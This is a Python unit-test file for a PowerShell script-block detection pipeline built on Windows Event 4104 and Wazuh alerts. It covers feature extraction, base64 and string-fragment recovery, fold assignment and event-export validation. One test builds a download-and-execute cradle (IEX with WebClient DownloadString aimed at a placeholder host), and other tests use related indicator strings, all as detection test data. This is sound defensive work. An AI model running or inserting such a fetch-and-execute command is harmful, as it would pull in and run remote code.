from __future__ import annotations

import base64
import json
import sys
import tempfile
import unittest
from pathlib import Path


SOURCE_ROOT = Path(__file__).resolve().parent
ROOT = SOURCE_ROOT.parent
sys.path.insert(0, str(SOURCE_ROOT))

import pipeline  # noqa: E402


class PipelineTests(unittest.TestCase):
    def test_strip_neutral_instrumentation(self) -> None:
        script = (
            "$sampleId='PST-001'; $indicator='IEX test'; Write-Output $indicator; "
            'Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
        )
        self.assertEqual(
            pipeline.strip_instrumentation(script),
            "$indicator='IEX test'; Write-Output $indicator",
        )

    def test_base64_recovery_is_non_executing(self) -> None:
        indicator = "IEX (New-Object Net.WebClient).DownloadString('https://x.example.invalid/a')"
        encoded = base64.b64encode(indicator.encode("utf-16le")).decode("ascii")
        core = (
            f"$encoded='{encoded}'; $indicator=[Text.Encoding]::Unicode.GetString("
            "[Convert]::FromBase64String($encoded)); Write-Output $indicator"
        )
        features = pipeline.extract_features(core)
        self.assertGreater(features["decoded_view_count"], 0)
        self.assertGreater(features["decoded_indicator_hit_count"], 0)
        self.assertIn("iex", features["execution_hits"])

    def test_fragment_reconstruction(self) -> None:
        core = "$indicator='Down' + 'loadString'; Write-Output $indicator"
        features = pipeline.extract_features(core)
        self.assertIn("downloadstring", features["download_hits"])
        self.assertGreater(features["recovered_indicator_hit_count"], 0)

    def test_group_assignment_never_splits_family(self) -> None:
        rows = []
        for truth in (0, 1):
            for family in range(10):
                for sample in range(2):
                    rows.append(
                        {
                            "truth": truth,
                            "evaluation_group": f"{truth}:family-{family}",
                            "id": f"PST-{truth}{family}{sample}",
                        }
                    )
        pipeline.assign_group_folds(rows, folds=5, seed=7)
        folds_by_group: dict[str, set[int]] = {}
        for row in rows:
            folds_by_group.setdefault(row["evaluation_group"], set()).add(row["cv_fold"])
        self.assertTrue(all(len(values) == 1 for values in folds_by_group.values()))

    def test_ambiguous_alert_is_rejected(self) -> None:
        first = (
            "$sampleId='PST-001'; Write-Output 'one'; "
            'Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
        )
        second = (
            "$sampleId='PST-002'; Write-Output 'two'; "
            'Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
        )
        alert = {"first": first, "second": second, "rule": {"id": "91809"}}
        normalized, status = pipeline.normalize_alert(
            alert, source_line=1, expected_ids={"PST-001", "PST-002"}
        )
        self.assertEqual(status, "ambiguous")
        self.assertEqual(normalized["sample_id"], "")

    def test_incidental_sample_id_is_not_mapped(self) -> None:
        alert = {
            "message": "diagnostic query mentions PST-001",
            "rule": {"id": "91809"},
        }
        normalized, status = pipeline.normalize_alert(
            alert, source_line=1, expected_ids={"PST-001"}
        )
        self.assertEqual(status, "unmapped")
        self.assertEqual(normalized["candidate_ids"], "")

    def test_fidelity_classification_is_not_generic_whitespace_matching(self) -> None:
        marker = '; Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
        expected = "$sampleId='PST-001'; Get-Process `\n| Select-Object Name" + marker
        observed = "$sampleId='PST-001'; Get-Process ` | Select-Object Name" + marker
        self.assertEqual(
            pipeline.classify_scriptblock_fidelity(observed, expected),
            "backtick_line_continuation_rendering",
        )
        self.assertEqual(
            pipeline.classify_scriptblock_fidelity(
                "$sampleId='PST-001'; Write-Output  'x'" + marker,
                "$sampleId='PST-001'; Write-Output 'x'" + marker,
            ),
            "unclassified_whitespace_drift",
        )


    def test_event_channel_mapping_is_complete_and_direct(self) -> None:
        scriptblock = (
            "$sampleId='PST-001'; Write-Output 'audit'; "
            'Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
        )
        record = {
            "sample_id": "PST-001",
            "channel": "Microsoft-Windows-PowerShell/Operational",
            "provider_name": "Microsoft-Windows-PowerShell",
            "computer": "Windows-Host",
            "record_id": 42,
            "time_created_utc": "2026-07-17T09:00:00Z",
            "event_id": 4104,
            "script_block_id": "sb-1",
            "message_number": 1,
            "message_total": 1,
            "script_block_text": scriptblock,
        }
        dataset = {"PST-001": {"id": "PST-001", "scriptblock": scriptblock}}
        with tempfile.TemporaryDirectory() as directory:
            export = Path(directory) / "event4104.jsonl"
            export.write_text(json.dumps(record) + "\n", encoding="utf-8")
            rows, by_sample, summary = pipeline.load_event_channel_events(
                export,
                {"PST-001"},
                dataset,
            )
        self.assertEqual(len(rows), 1)
        self.assertEqual(summary["mapped_sample_count"], 1)
        self.assertEqual(summary["exact_dataset_scriptblock_match_count"], 1)
        self.assertEqual(
            summary["channel"],
            "Microsoft-Windows-PowerShell/Operational",
        )
        self.assertEqual(by_sample["PST-001"]["scriptblock_text"], scriptblock)

    def test_event_channel_rejects_wrong_event_id(self) -> None:
        scriptblock = (
            "$sampleId='PST-001'; Write-Output 'audit'; "
            'Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
        )
        record = {
            "sample_id": "PST-001",
            "event_id": 4103,
            "script_block_text": scriptblock,
        }
        dataset = {"PST-001": {"id": "PST-001", "scriptblock": scriptblock}}
        with tempfile.TemporaryDirectory() as directory:
            export = Path(directory) / "wrong-event.jsonl"
            export.write_text(json.dumps(record) + "\n", encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "Event 4104"):
                pipeline.load_event_channel_events(
                    export,
                    {"PST-001"},
                    dataset,
                )

    def test_event_channel_rejects_duplicate_sample(self) -> None:
        scriptblock = (
            "$sampleId='PST-001'; Write-Output 'audit'; "
            'Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
        )
        record = {
            "sample_id": "PST-001",
            "event_id": 4104,
            "script_block_text": scriptblock,
        }
        dataset = {"PST-001": {"id": "PST-001", "scriptblock": scriptblock}}
        with tempfile.TemporaryDirectory() as directory:
            export = Path(directory) / "duplicates.jsonl"
            export.write_text(
                json.dumps(record) + "\n" + json.dumps(record) + "\n",
                encoding="utf-8",
            )
            with self.assertRaisesRegex(ValueError, "duplicate_sample_ids"):
                pipeline.load_event_channel_events(
                    export,
                    {"PST-001"},
                    dataset,
                )

    def test_event_channel_rejects_content_drift(self) -> None:
        expected = (
            "$sampleId='PST-001'; Write-Output 'expected'; "
            'Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
        )
        observed = expected.replace("'expected'", "'changed'")
        record = {
            "sample_id": "PST-001",
            "event_id": 4104,
            "script_block_text": observed,
        }
        dataset = {"PST-001": {"id": "PST-001", "scriptblock": expected}}
        with tempfile.TemporaryDirectory() as directory:
            export = Path(directory) / "drift.jsonl"
            export.write_text(json.dumps(record) + "\n", encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "non_exact_dataset_scriptblock_ids"):
                pipeline.load_event_channel_events(
                    export,
                    {"PST-001"},
                    dataset,
                )

    def test_recorded_event_channel_capture_is_complete(self) -> None:
        dataset_path = ROOT / "dataset" / "powershell_scriptblock_samples.json"
        event_path = ROOT / "messlauf" / "local_event4104_dataset_run.jsonl"
        data = json.loads(dataset_path.read_text(encoding="utf-8"))
        dataset = {str(row["id"]).upper(): row for row in data}
        _, by_sample, summary = pipeline.load_event_channel_events(
            event_path,
            set(dataset),
            dataset,
        )
        self.assertEqual(len(by_sample), 300)
        self.assertEqual(summary["mapped_sample_count"], 300)
        self.assertEqual(summary["exact_dataset_scriptblock_match_count"], 300)
        self.assertEqual(summary["non_exact_dataset_scriptblock_ids"], [])

    def test_result_rows_score_observed_event_not_dataset_copy(self) -> None:
        dataset_scriptblock = (
            "$sampleId='PST-001'; Get-Date; "
            'Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
        )
        observed_scriptblock = (
            "$sampleId='PST-001'; $indicator='Invoke-Expression DownloadString'; "
            "Write-Output $indicator; "
            'Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
        )
        dataset = [
            {
                "id": "PST-001",
                "label": "benign",
                "scriptblock": dataset_scriptblock,
                "evaluation_group": "benign:test",
            }
        ]
        event_rows = {
            "PST-001": {
                "scriptblock_text": observed_scriptblock,
                "scriptblock_id": "sb-1",
                "scriptblock_sha256": "abc",
            }
        }
        rows, _ = pipeline.build_result_rows(dataset, {}, event_rows)
        self.assertEqual(
            rows[0]["lexical_input_source"],
            "windows_event_4104_scriptblocktext",
        )
        self.assertIn("Invoke-Expression", rows[0]["analysis_text"])
        self.assertGreater(rows[0]["lexical_score"], 0)

    def test_dataset_validation(self) -> None:
        dataset_path = ROOT / "dataset" / "powershell_scriptblock_samples.json"
        data = json.loads(dataset_path.read_text(encoding="utf-8"))
        report = pipeline.dataset_validation_report(data)
        self.assertTrue(report["valid"], report["errors"])
        self.assertEqual(report["metadata_leakage"], [])
        self.assertEqual(report["instrumentation_residue_ids"], [])
        self.assertEqual(report["cross_group_casefold_duplicate_sets"], [])
        serialized = json.dumps(data)
        for artificial_token in ("OMITTED", "PLACEHOLDER", "REDACTED", "<INERT>"):
            self.assertNotIn(artificial_token, serialized)


if __name__ == "__main__":
    unittest.main()
